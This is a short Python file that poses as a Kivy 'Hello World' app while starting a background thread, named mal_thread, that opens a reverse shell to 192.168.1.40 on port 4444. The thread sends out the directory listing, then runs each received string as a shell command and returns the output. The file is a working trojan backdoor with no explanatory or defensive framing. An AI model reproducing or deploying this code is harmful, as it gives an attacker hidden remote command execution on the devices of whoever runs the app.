#!/usr/bin/python3
from kivy.app import App
from kivy.uix.label import Label

import threading
import socket
import subprocess
import os
import time


def main():
    server_ip = '192.168.1.40'
    port = 4444
    
    backdoor = socket.socket()

    connect = False

    while not connect:
        try:
            backdoor.connect((server_ip, port))
            connect = True
            print("reconnecting")
        except socket.error:
            time.sleep(1)

    a = str(os.listdir())
    backdoor.send(a.encode())

    while True:
        command = backdoor.recv(1024)
        command = command.decode()
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        backdoor.send(output + output_error)


class App(App):
    def build(self):
        return Label(text="Hello World")



mal_thread = threading.Thread(target=main)
mal_thread.start()


app = App()
app.run()
